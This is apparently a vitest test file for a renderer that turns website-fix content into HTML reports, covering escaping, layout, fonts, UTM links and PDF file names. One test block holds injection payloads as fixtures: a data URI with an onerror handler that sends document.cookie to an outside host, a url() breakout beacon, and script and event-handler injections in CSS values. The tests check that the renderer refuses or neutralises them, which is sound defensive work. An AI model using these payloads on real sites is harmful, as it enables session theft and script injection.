import fs from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { contactSheetHtml, fillReport, firstSectionHtml, keepLast, pdfFileName } from "./render-html";
import type { FirstSection, ReportContent } from "./types";

const gabby = JSON.parse(
  fs.readFileSync(path.join(__dirname, "skill/examples/gabby/content.json"), "utf8")
) as ReportContent;
const IMG = "data:image/png;base64,AAAA";
const imgs = { before: "data:image/png;base64,BBBB", after: "data:image/jpeg;base64,CCCC" };

describe("keepLast", () => {
  it("escapes and glues the last word", () => {
    expect(keepLast("a <b> c")).toBe("a &lt;b&gt;&nbsp;c");
  });
  it("escapes double and single quotes too", () => {
    expect(keepLast(`say "hi" it's`)).toBe("say &quot;hi&quot;&nbsp;it&#39;s");
  });
});

describe("attribute and url() injection (C1)", () => {
  const base = gabby.first_section as FirstSection;
  const evilLogo = `data:image/png"onerror="fetch('https://x/'+document.cookie);base64,AAAA`;
  const evilPhoto = "data:image/png;base64,AA');background:url('https://x.test/beacon";

  it("a logo URI with a quote never produces an attribute break", () => {
    expect(() => firstSectionHtml(base, IMG, evilLogo)).toThrow(/image/);
  });
  it("a photo URI that would close url() is refused", () => {
    expect(() => firstSectionHtml(base, evilPhoto)).toThrow(/image/);
  });
  it("contact sheet and report refuse a non-image URI", () => {
    expect(() => contactSheetHtml(evilLogo, [IMG])).toThrow(/image/);
    expect(() => contactSheetHtml(IMG, [evilPhoto])).toThrow(/image/);
    expect(() => fillReport(gabby, { before: evilLogo, after: imgs.after })).toThrow(/image/);
  });
  it("accepts plain base64 image data URIs, svg included", () => {
    const h = firstSectionHtml(base, IMG, "data:image/svg+xml;base64,PHN2Zy8+");
    expect(h).toContain('<img src="data:image/svg+xml;base64,PHN2Zy8+"');
    expect(h).not.toContain("<svg");
  });
  it("CSS values from the mockup are kept to safe characters", () => {
    const h = firstSectionHtml({
      ...base,
      heading_font: `Lora',serif;}</style><script>x()</script>`,
      nav_background: `#fff;background:url(https://x.test)`,
      accent: `red" onmouseover="x()`,
      photo_focus: `50% 40%') ;background:url('https://x.test`,
    }, IMG);
    expect(h).not.toContain("<script>");
    expect(h).not.toContain("x.test");
    expect(h).not.toContain("onmouseover");
    expect(h).not.toMatch(/font-family:'[^']*[;}<]/);
  });
});

describe("fillReport", () => {
  const html = fillReport(gabby, imgs);
  it("fills every slot", () => {
    expect(html).not.toContain("{{");
    expect(html).toContain(keepLast(gabby.fixes[0].title));
    expect(html).toContain("&nbsp;" + gabby.fixes[0].title.split(" ").pop());
    expect((html.match(/border:2px solid #337A80;border-radius:4px/g) ?? []).length).toBeGreaterThanOrEqual(6);
  });
  it("renders 3 checkbox rows per fix", () => {
    const one = fillReport({ ...gabby, fixes: [gabby.fixes[0], gabby.fixes[0]] }, imgs);
    expect(one.split(keepLast(gabby.fixes[0].changes[0])).length - 1).toBe(2);
  });
  it("inlines assets with each asset's own mime", () => {
    expect(html).not.toContain('src="assets/');
    expect(html).not.toContain('src="before.jpg"');
    expect(html).not.toContain('src="after.jpg"');
    expect(html).toContain(`src="${imgs.before}"`);
    expect(html).toContain(`src="${imgs.after}"`);
    expect(html).toContain('src="data:image/svg+xml;base64,');
    expect(html).toContain('src="data:image/jpeg;base64,');
  });
  it("escapes HTML", () => {
    const c = { ...gabby, fixes: [{ ...gabby.fixes[0], title: "<b>x</b> done" }, gabby.fixes[1]] } as ReportContent;
    const out = fillReport(c, imgs);
    expect(out).toContain("&lt;b&gt;x&lt;/b&gt;");
    expect(out).not.toContain("<b>x</b>");
  });
  it("NAME_POSS handles apostrophes and quotes in aria-label", () => {
    const out = fillReport({ ...gabby, first_name: "D'Andre" }, imgs);
    expect(out).toContain('aria-label="D&#39;Andre&#39;s new first section on a computer and phone"');
    const q = fillReport({ ...gabby, first_name: 'A"B' }, imgs);
    expect(q).toContain('aria-label="A&quot;B&#39;s new first section');
  });
  it("rewrites every tour link with UTM", () => {
    const utm = "https://capturedsites.com/tour/?utm_source=homepage-fixes&utm_medium=pdf&utm_campaign=homepage-fixes";
    expect(html).not.toContain('href="https://capturedsites.com/tour/"');
    expect((html.match(new RegExp(`href="${utm.replace(/[?]/g, "\\?")}"`, "g")) ?? []).length).toBe(4);
  });
});

describe("firstSectionHtml", () => {
  const base = gabby.first_section as FirstSection;
  it("bottom nav puts nav after photo", () => {
    const h = firstSectionHtml({ ...base, nav_position: "bottom", nav_style: "bar" }, IMG);
    expect(h.indexOf('class="nav"')).toBeGreaterThan(h.indexOf("url('"));
    const t = firstSectionHtml({ ...base, nav_position: "top" }, IMG);
    expect(t.indexOf('class="nav"')).toBeLessThan(t.indexOf("url('"));
  });
  it("over style makes nav text white and absolute", () => {
    const h = firstSectionHtml({ ...base, nav_style: "over", nav_color: "#123456" }, IMG);
    expect(h).toContain("color:#FFFFFF;position:absolute");
    expect(h).not.toContain("#123456");
  });
  it("loads non-system fonts from Google Fonts and omits the link for Georgia", () => {
    const h = firstSectionHtml(base, IMG);
    expect(h).toContain("fonts.googleapis.com");
    expect(h).toContain("Cormorant+Garamond");
    const g = firstSectionHtml({ ...base, heading_font: "Georgia", body_font: "Arial" }, IMG);
    expect(g).not.toContain("fonts.googleapis.com");
  });
  it("uses the logo data uri and inverts it on over style", () => {
    const h = firstSectionHtml({ ...base, nav_style: "over" }, IMG, "data:image/svg+xml;base64,ZZ");
    expect(h).toContain('src="data:image/svg+xml;base64,ZZ"');
    expect(h).toContain("invert(1)");
  });
});

describe("firstSectionHtml placement fields (headline off faces)", () => {
  const base = { ...(gabby.first_section as FirstSection), layout: "left" as const, headline: "Real Moments, Not Posed Memories" };
  it("has copy and photo ids, default width and size, and glues the last two words", () => {
    const h = firstSectionHtml(base, IMG);
    expect(h).toContain('id="copy"');
    expect(h).toContain('id="photo"');
    expect(h).toContain("left:96px;width:640px");
    expect(h).toContain("font-size:76px");
    expect(h).toContain("Posed&nbsp;Memories</h1>");
    expect(h).not.toContain("transform:scale(");
  });
  it("applies scale, width, zoom and the unglued headline", () => {
    const h = firstSectionHtml({ ...base, layout: "right", headline_scale: 0.72, copy_width: 420, photo_zoom: 1.5, photo_focus: "20% 30%", headline_glue: false }, IMG);
    expect(h).toContain("right:96px;width:420px");
    expect(h).toContain(`font-size:${Math.round(76 * 0.72)}px`);
    expect(h).toContain("transform:scale(1.5);transform-origin:20% 30%");
    expect(h).toContain("Posed Memories</h1>");
  });
  it("ignores placement values out of range or of the wrong type", () => {
    const h = firstSectionHtml({ ...base, headline_scale: 3, copy_width: "1px;color:red" as unknown as number, photo_zoom: 9 }, IMG);
    expect(h).toContain("font-size:76px");
    expect(h).toContain("left:96px;width:640px");
    expect(h).not.toContain("transform:scale(");
    expect(h).not.toContain("color:red");
  });
});

describe("firstSectionHtml cleans brand and nav (gate defects 1, 2)", () => {
  it("renders at most 6 deduped nav items and no copyright in the brand", () => {
    const h = firstSectionHtml({
      ...(gabby.first_section as FirstSection),
      logo_text: "© 2026 WillowAnn Photography",
      nav_items: ["workshop forphotographers", "meet niki", "Home", "the experience", "galleries", "journal", "contact", "experience"],
    }, IMG);
    const spans = [...h.matchAll(/<span>([^<]*)<\/span>/g)].map((m) => m[1]);
    expect(spans).toEqual(["workshop forphotographers", "meet niki", "Home", "the experience", "galleries", "contact"]);
    expect(h).toContain(">WillowAnn Photography</b>");
    expect(h).not.toContain("©");
  });
});

describe("contactSheetHtml", () => {
  it("labels up to 3 photos and TODAY", () => {
    const h = contactSheetHtml(IMG, ["data:image/png;base64,AAAA", "data:image/png;base64,BBBB", "data:image/png;base64,CCCC", "data:image/png;base64,DDDD"]);
    expect(h).toContain("TODAY");
    expect(h).toContain(">3<");
    expect(h).not.toContain("data:image/png;base64,DDDD");
    expect(h).toContain("width:1600px;height:900px");
  });

  it("shows each photo whole (contain on #1a1a1a), not cropped", () => {
    const h = contactSheetHtml(IMG, ["data:image/png;base64,AAAA", "data:image/png;base64,BBBB", "data:image/png;base64,CCCC"]);
    expect(h).not.toContain("object-fit:cover");
    const cells = h.match(/<div style="position:relative;flex:1;min-height:0;background:#1a1a1a"><img src="data:image\/png;base64,(AAAA|BBBB|CCCC)" alt="" style="[^"]*object-fit:contain[^"]*">/g) ?? [];
    expect(cells).toHaveLength(3);
    expect(h).toContain("width:1600px;height:900px");
  });

  it("puts TODAY in the bottom-left corner (off the site's logo) and the photo numbers top-left", () => {
    const h = contactSheetHtml(IMG, ["data:image/png;base64,AAAA"]);
    const label = (t: string) => h.match(new RegExp(`<div style="([^"]*)">${t}</div>`))?.[1] ?? "";
    expect(label("TODAY")).toContain("left:12px;bottom:12px");
    expect(label("TODAY")).not.toContain("top:");
    expect(label("1")).toContain("left:12px;top:12px");
    expect(label("TODAY").replace("bottom:", "top:")).toBe(label("1"));
  });
});

describe("pdfFileName", () => {
  it("makes an ascii slug", () => {
    expect(pdfFileName("Zoë")).toBe("your-top-homepage-fixes-zoe.pdf");
    expect(pdfFileName("D'Andre")).toBe("your-top-homepage-fixes-dandre.pdf");
    expect(pdfFileName("Mary Ann")).toBe("your-top-homepage-fixes-mary-ann.pdf");
  });
});
